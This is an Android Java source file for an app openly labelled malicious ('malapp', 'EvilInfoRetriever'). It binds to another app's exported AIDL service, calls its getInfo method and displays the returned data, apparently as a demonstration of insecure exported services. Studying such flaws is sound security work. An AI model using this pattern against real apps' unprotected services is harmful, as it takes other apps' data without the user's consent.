package com.dt.malapp;

import com.dt.malapp.R;
import com.dt.adamapp.InfoProviderRemote;

import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.util.Log;
import android.view.Menu;
import android.widget.Toast;

public class EvilInfoRetriever extends Activity {

	InfoProviderRemote providerRemote;
	
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_evil_info_retriever);
		 Intent serviceIntent=new Intent();
	        serviceIntent.setClassName("com.dt.adamapp", 
	        		"com.dt.adamapp.InfoProviderService");
	        boolean ok=bindService(serviceIntent, mServiceConnection,Context.BIND_AUTO_CREATE);
	        Log.v("ok", String.valueOf(ok));
	}
	  private ServiceConnection mServiceConnection=new ServiceConnection() {

			@Override
			public void onServiceDisconnected(ComponentName name) {

			}

			@Override
			public void onServiceConnected(ComponentName name, IBinder service) {
				// get instance of the aidl binder
				providerRemote = InfoProviderRemote.Stub.asInterface(service);
				try {
					String message=providerRemote.getInfo("testString");
int duration = Toast.LENGTH_LONG;

					String msg =  "Evil App " + message;
					Toast toast = Toast.makeText(getApplicationContext(), msg, duration);
					toast.show();
					Log.v("EvilApp - Message", "Evil App " + message);
				} catch (RemoteException e) {
					Log.e("RemoteException", e.toString());
				}

			}
		};

	
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.evil_info_retriever, menu);
		return true;
	}

}
